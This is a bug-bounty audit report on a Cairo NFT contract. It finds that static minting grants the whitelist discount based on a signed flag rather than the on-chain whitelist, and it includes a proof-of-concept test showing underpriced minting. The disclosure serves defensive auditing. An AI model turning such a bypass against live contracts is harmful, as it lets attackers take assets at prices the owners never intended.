# 57735 sc insight whitelist bypass in static mint pricing trusting signed params whitelisted instead of on chain iswhitelisted leads to underpricing and access control violation&#x20;

**Submitted on Oct 28th 2025 at 14:58:46 UTC by @ehappyer for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57735
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nft/nft.cairo>
* **Impacts:** Unauthorized minting of NFTs

## Description

### Brief/Intro

The static mint path selects the discounted price by reading `params.whitelisted` from an off-chain signed message, rather than enforcing the on-chain whitelist mapping. This allows the minting flow to accept the lower `whitelisted_mint_price` when the signature says the user is whitelisted, even if they are not present in `self.nft_node.whitelisted`. As a result, non-whitelisted users can pay the discounted price or gain whitelist-only access when the off-chain signer or message construction is permissive.

### Vulnerability Details

The `_mint_static_price_batch` function in the `nft.cairo` uses an off-chain boolean `params.whitelisted` to select price, without enforcing the on-chain whitelist mapping. At mint, price is computed as:

```cairo
let mint_price = if params.whitelisted {
    self.nft_parameters.whitelisted_mint_price.read()
} else {
    self.nft_parameters.mint_price.read()
};
```

This means the discounted `whitelisted_mint_price` is granted whenever the signed payload sets `params.whitelisted = true`, regardless of on-chain state. The `isWhitelisted` function is not used in the static mint pricing branch; the price decision does not call `isWhitelisted(msg.sender)` nor cross-check it.

References in source:

* Static price branch: [src/nft/nft.cairo:\_mint\_static\_price\_batch#L331-L335](https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/src/nft/nft.cairo#L331C1-L335C19)

```cairo
        fn _mint_static_price_batch(
            ref self: ContractState,
            static_params: Array<StaticPriceParameters>,
            expected_paying_token: ContractAddress,
            expected_mint_price: u256,
        ) {
...
                // @audit Non-whitelisted users can mint at the discounted price
                let mint_price = if params.whitelisted {
                    self.nft_parameters.whitelisted_mint_price.read()
                } else {
                    self.nft_parameters.mint_price.read()
                };
```

* on-chain whitelist check (unused here): [src/nft/nft.cairo:isWhitelisted#L205-L207](https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/src/nft/nft.cairo#L205C1-L207C10)

```cairo
        fn isWhitelisted(self: @ContractState, whitelisted: ContractAddress) -> bool {
            self.nft_node.whitelisted.read(whitelisted)
        }
```

### Impact Details

* Non-whitelisted users can mint at the discounted price or access whitelist-only phases if they obtain a permissive signed message with `whitelisted = true` (e.g., signer misconfiguration, lax off-chain filters, compromised signer).
* The on-chain whitelist mapping becomes ineffective for pricing and access control in this path; business rules intended to be enforced on-chain are bypassed by off-chain assertions.

## Recommended Fix

{% hint style="warning" %}
Gate both price and access using on-chain whitelist membership (e.g., `isWhitelisted(msg.sender)`) rather than relying solely on off-chain `params.whitelisted`. If off-chain signatures are used, they should authenticate the caller and immutable parameters, but must not override on-chain membership state. Concretely:

* When deciding price: `let mint_price = if isWhitelisted(msg.sender) { whitelisted_mint_price } else { mint_price };`
* When enforcing whitelist-only phases: require `isWhitelisted(msg.sender)` in the restricted branch.
* If keeping signed params, ensure they cannot be used to arbitrarily assert whitelist status; use signatures only to prove integrity of mutable parameters that do not affect access control.
  {% endhint %}

## Proof of Concept

Verify whether, in the static-price minting path, it’s possible to exploit the `whitelisted = true` flag in the signed parameters to receive the whitelist price without actually being whitelisted on-chain, resulting in whitelist bypass and underpricing. Demonstrate that the contract currently determines the price based on the off-chain signed parameters, rather than verifying it via the on-chain `isWhitelisted(account)` check.

{% stepper %}
{% step %}

### Test Code

Add the following test case to `src/tests/test_nft.cairo`.

```cairo
#[test]
fn test_static_mint_whitelist_bypass_underpricing() {
    // Setup signer, NFT, ERC20 mock with default prices
    let signer = deploy_account_mock();
    let (_, _nft, _, erc20mock) = deploy_factory_nft_receiver_erc20(signer, false, true);
    let nft = INFTDispatcher { contract_address: _nft };
    let erc20 = IERC20Dispatcher { contract_address: erc20mock };

    // Ensure signer is NOT in on-chain whitelist
    assert_eq!(nft.isWhitelisted(signer), false);

    // Forge signed static mint params marking whitelisted=true for a non-whitelisted user
    let receiver = signer;
    let token_id: u256 = 0;
    let whitelisted: bool = true; // <-- maliciously set in signed params
    let token_uri = constants::TOKEN_URI();

    let static_price_hash = StaticPriceHash { receiver, token_id, whitelisted, token_uri };
    start_cheat_caller_address_global(signer);
    let signature: Span<felt252> = sign_message(static_price_hash.get_message_hash(_nft)).into();
    stop_cheat_caller_address_global();

    let static_params = StaticPriceParameters { receiver, token_id, whitelisted, token_uri, signature };
    let mut static_params_array = array![static_params];

    // Observe balances before
    let signer_balance_before = erc20.balance_of(signer);
    let platform_balance_before = erc20.balance_of(constants::PLATFORM());
    let creator_balance_before = erc20.balance_of(constants::CREATOR());

    let mut spy = spy_events();

    // Call static mint with expectedMintPrice set to WL price; should succeed despite not whitelisted on-chain
    start_cheat_caller_address(_nft, signer);
    nft.mintStaticPrice(static_params_array, erc20mock, constants::WL_MINT_PRICE());

    // Event shows payment at discounted WL price
    spy.assert_emitted(
        @array![
            (
                _nft,
                NFT::Event::PaidEvent(
                    NFT::Paid { user: signer, payment_token: erc20mock, amount: constants::WL_MINT_PRICE() },
                ),
            ),
        ],
    );

    // Check underpricing materialized in balances
    let signer_balance_after = erc20.balance_of(signer);
    let platform_balance_after = erc20.balance_of(constants::PLATFORM());
    let creator_balance_after = erc20.balance_of(constants::CREATOR());

    assert_eq!(signer_balance_before - constants::WL_MINT_PRICE(), signer_balance_after);
    assert_eq!(
        creator_balance_before
            + (constants::WL_MINT_PRICE() - (platform_balance_after - platform_balance_before)),
        creator_balance_after,
    );

    // Owner of the freshly minted token is the signer
    assert_eq!(ERC721ABIDispatcher { contract_address: _nft }.owner_of(token_id), signer);
}
```

{% endstep %}

{% step %}

### Run Test

```bash
snforge test test_static_mint_whitelist_bypass_underpricing
```

{% endstep %}

{% step %}

### Test Result

The test runs successfully:

```bash
Collected 1 test(s) from nft package
Running 1 test(s) from src/
[PASS] nft::tests::test_nft::test_static_mint_whitelist_bypass_underpricing (l1_gas: ~0, l1_data_gas: ~5184, l2_gas: ~7216640)
Tests: 1 passed, 0 failed, 0 ignored, 46 filtered out
```

{% endstep %}
{% endstepper %}

## References

* Path: `src/nft/nft.cairo` — static mint pricing branch (uses `params.whitelisted` to pick `whitelisted_mint_price`).\
  [src/nft/nft.cairo:\_mint\_static\_price\_batch#L331-L335](https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/src/nft/nft.cairo#L331C1-L335C19)
* On-chain state mentioned: `self.nft_node.whitelisted` exists but is not checked.\
  [src/nft/nft.cairo:isWhitelisted#L205-L207](https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/src/nft/nft.cairo#L205C1-L207C10)

***

If you want, I can produce a minimal patch suggestion (Cairo diff) showing where to add an on-chain `isWhitelisted(msg.sender)` check in the static-price branch.
